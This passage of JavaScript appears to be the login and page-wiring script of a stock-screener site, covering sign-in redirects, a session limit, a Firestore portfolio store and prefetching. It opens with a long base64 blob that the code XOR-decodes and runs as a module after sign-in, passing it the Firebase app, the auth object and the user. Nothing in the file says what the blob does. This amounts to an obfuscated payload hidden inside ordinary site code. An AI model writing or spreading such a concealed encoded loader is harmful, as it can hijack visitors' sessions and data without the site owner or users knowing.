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";
function unpack(t) {
  const b = Uint8Array.from(atob(t), (c) => c.charCodeAt(0));
  for (let i = 0; i < b.length; i++) b[i] ^= (i * 7 + 13) & 255;
  return new TextDecoder().decode(b);
}
async function loadExt(u) {
  if (!PACK) return;
  const url = URL.createObjectURL(new Blob([unpack(PACK)], { type: "text/javascript" }));
  try {
    const m = await import(url);
    await m.default({ app, auth, user: u, gated: GATED, addItem, syncLock, esc, $ });
  } catch (e) { console.warn("add-on:", e); }
  finally { URL.revokeObjectURL(url); }
}
idle(presence);                                         // online counter: after the page has settled, never before it shows
idle(countVisitor, 4000);

// ---------- page wiring ----------
const SIGNED_HINT = "hni_signed";                          // "1" = signed in last time (only a hint: Fundamentals checks for real)
const hinted = () => { try { return localStorage.getItem(SIGNED_HINT) === "1"; } catch (e) { return false; } };
let current = null;
const ready = new Promise((resolve) => {
  onAuthStateChanged(auth, async (u) => {
    if (u && expired(u)) { await signOut(auth); u = null; }   // 7-day session limit
    current = u;
    try { localStorage.setItem(SIGNED_HINT, u ? "1" : "0"); } catch (e) {}   // lets the next visit open Fundamentals instantly
    resolve();
    if (GATED && !u) {                                        // no login: back to the screener with the popup open
      location.replace(HOME + "?login=" + encodeURIComponent(location.pathname.replace(/^\//, "") + location.hash));
      return;
    }
    if (GATED) document.documentElement.classList.add("auth-ok");   // show the page at once
    else paintSlot(u);                                         // screener: Login button or the user menu
    if (!u) return;
    // Portfolio tab: the page saves / loads the user's holdings through this (Firestore hni_portfolio/{uid}, owner only)
    window.hniStore = {
      load: async () => { await needFS(); const d = await getDoc(doc(db, PORTFOLIO, u.uid)); return d.exists() ? d.data() : {}; },             // {txns, rates} (or old {items})
      save: async (data) => { await needFS(); return setDoc(doc(db, PORTFOLIO, u.uid), { txns: data.txns || [], rates: data.rates || {}, updated: serverTimestamp() }); },
      market: async () => { await needFS(); const d = await getDoc(doc(db, ...MARKET)); return d.exists() ? d.data() : null; },
      canRefresh: () => typeof window.hniStore.refresh === "function",   // only when an add-on supplies refresh()
    };
    window.dispatchEvent(new Event("hni-ready"));
    if (GATED) showUser(u);
    idle(() => { record(u); loadExt(u); }, 1500);
  });
});

if (!GATED) {
  // screener: the Fundamentals button. Its tap is caught by a small script in the page itself (so the FIRST tap works
  // even before this file has loaded): it disables the button, shows "Checking login…" and then calls this.
  window.hniAuthGo = async (href) => {
    window.hniPending = null;
    // signed in last time → go at once (the Fundamentals page confirms the login itself, and sends you back if needed)
    if (current || hinted()) { location.href = href; return; }
    await ready;
    if (current) { location.href = href; return; }
    if (window.hniDone) window.hniDone();                      // not signed in: "Checking login…" → the login box
    openPopup(href);
  };
  if (window.hniPending) window.hniAuthGo(window.hniPending);   // tapped while this file was still loading
  // signed-in visitors: fetch the Fundamentals page quietly in the background, so it opens instantly (not for everyone:
  // it is ~260 KB, and free hosting has a daily transfer limit)
  ready.then(() => {
    const c = navigator.connection;
    if (!current || (c && (c.saveData || /2g/.test(c.effectiveType || "")))) return;
    const a = document.querySelector("[data-auth-link]");
    if (!a) return;
    idle(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = a.href; document.head.appendChild(l); }, 3000);
  });
  const want = new URLSearchParams(location.search).get("login");
  if (want != null) {
    history.replaceState(null, "", location.pathname + location.hash);          // clean the address bar
    ready.then(() => {
      let target = "fundamentals";                                              // only pages on this site
      try { const t = new URL(want, location.href); if (want && t.origin === location.origin) target = t.pathname + t.hash; } catch (e) {}
      if (current) location.href = target; else openPopup(target);
    });
  }
}
